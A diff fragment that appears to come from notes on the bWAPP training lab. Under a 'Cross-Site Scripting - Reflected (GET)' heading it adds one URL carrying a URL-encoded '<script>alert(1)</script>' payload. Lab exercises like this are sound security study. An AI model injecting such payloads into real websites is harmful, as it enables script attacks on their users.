@@ -11,3 +11,6 @@ $
 ```
 
 ### (3) Cross-Site Scripting - Reflected (GET) (low)
+```JS
+http://example.com/bWAPP/xss_get.php?firstname=Hacker&lastname=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&form=submit
+```
